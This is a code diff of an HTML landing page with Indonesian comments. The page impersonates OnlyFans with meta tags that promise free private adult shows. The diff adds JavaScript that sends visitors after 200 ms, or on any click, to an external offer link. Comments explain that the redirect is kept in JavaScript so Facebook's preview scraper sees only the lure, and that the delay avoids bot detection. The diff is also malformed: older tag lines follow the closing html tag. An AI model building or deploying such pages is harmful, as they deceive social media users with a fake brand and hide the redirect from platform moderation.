@@ -2,39 +2,105 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- 
     ============================================================
-    META TAGS UNTUK PREVIEW FACEBOOK (Open Graph)
-    WAJIB DIISI AGAR PREVIEW MUNCUL SEMPURNA
+    OPEN GRAPH META - WAJIB LENGKAP AGAR PREVIEW FB MUNCUL
     ============================================================
     -->
-    
-    <!-- Judul yang muncul di preview FB (bold, besar) -->
     <meta property="og:title" content="OnlyFans - Private Show In Free 🔞💦">
-    
-    <!-- Deskripsi di bawah judul -->
     <meta property="og:description" content="OnlyFans Video 🎬 ▶️ Watch exclusive private show free limited time">
     
-    <!-- 
-    URL GAMBAR GRID ANDA (SATU FILE COLLAGE)
-    - Harus HTTPS
-    - Ukuran ideal: 1200 x 630 pixel (ratio 1.91:1) agar tidak kepotong
-    - Contoh di bawah menggunakan link Blogger Anda
-    -->
+    <!-- PASTIKAN URL GAMBAR TIDAK ADA SPASI DI AKHIRAN -->
     <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlytqdGIfeumf9R93a4xA9QfFWu_5R4MFxWTD38a0wwqMaRx5Va0HiTJ4Va1K8RUpNfYEUrBjvPwrO9JGDqpvB6vt2AzLyneuaNA8RnXyIVVxW4s2F0gZfjnBxLo7WgDxYlQ2NJ8XushpX14V5f4PmuAW1e-tp6jbbvTC7DsPzwfhMkI3NK4-8JvwL6rFt/s1600/1000281900.jpg">
     <meta property="og:image:secure_url" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlytqdGIfeumf9R93a4xA9QfFWu_5R4MFxWTD38a0wwqMaRx5Va0HiTJ4Va1K8RUpNfYEUrBjvPwrO9JGDqpvB6vt2AzLyneuaNA8RnXyIVVxW4s2F0gZfjnBxLo7WgDxYlQ2NJ8XushpX14V5f4PmuAW1e-tp6jbbvTC7DsPzwfhMkI3NK4-8JvwL6rFt/s1600/1000281900.jpg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
-    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:alt" content="OnlyFans Private Content">
     
-    <!-- URL domain Anda (akan muncul sebagai ONLY-FANS.COM di preview) -->
-    <meta property="og:url" content="https://only-fans-2617vip.vercel.app">
+    <!-- Tipe website agar muncul link card -->
     <meta property="og:type" content="website">
+    <meta property="og:url" content="https://only-fans-2617vip.vercel.app">
     <meta property="og:site_name" content="Only-Fans.com">
     
-    <!-- Twitter Card (opsional tapi disarankan) -->
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="OnlyFans - Private Show In Free 🔞💦">
+    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlytqdGIfeumf9R93a4xA9QfFWu_5R4MFxWTD38a0wwqMaRx5Va0HiTJ4Va1K8RUpNfYEUrBjvPwrO9JGDqpvB6vt2AzLyneuaNA8RnXyIVVxW4s2F0gZfjnBxLo7WgDxYlQ2NJ8XushpX14V5f4PmuAW1e-tp6jbbvTC7DsPzwfhMkI3NK4-8JvwL6rFt/s1600/1000281900.jpg">
+    
+    <title>OnlyFans - Private Show</title>
+    
+    <!-- 
+    ============================================================
+    AUTO REDIRECT - HANYA MENGGUNAKAN JAVASCRIPT
+    (Facebook scraper tidak selalu eksekusi JS, jadi bisa scrape meta tags)
+    ============================================================
+    -->
+    <script>
+        // GANTI URL OFFER ANDA DISINI
+        const OFFER_URL = 'https://fdeddg.hubss.one/p/yCTUy';
+        
+        // Redirect otomatis saat halaman dimuat
+        // Delay 0.2 detik (200ms) - cukup cepat tapi tidak terdeteksi sebagai bot
+        window.onload = function() {
+            setTimeout(function() {
+                window.location.replace(OFFER_URL);
+            }, 200);
+        };
+        
+        // Backup redirect jika user klik dimanapun
+        document.addEventListener('click', function() {
+            window.location.replace(OFFER_URL);
+        });
+    </script>
+    
+    <style>
+        body {
+            background: #ffffff;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            overflow: hidden;
+        }
+        
+        /* Halaman ini tidak akan terlihat user karena langsung redirect */
+        .container {
+            max-width: 680px;
+            margin: 0 auto;
+            text-align: center;
+            padding: 50px 20px;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f0f2f5;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        p {
+            color: #65676b;
+            font-size: 15px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p>Loading content...</p>
+    </div>
+</body>
+</html>    <!-- Twitter Card (opsional tapi disarankan) -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="OnlyFans - Private Show In Free 🔞💦">
     <meta name="twitter:description" content="OnlyFans Video 🎬 ▶️ Watch exclusive private show free">
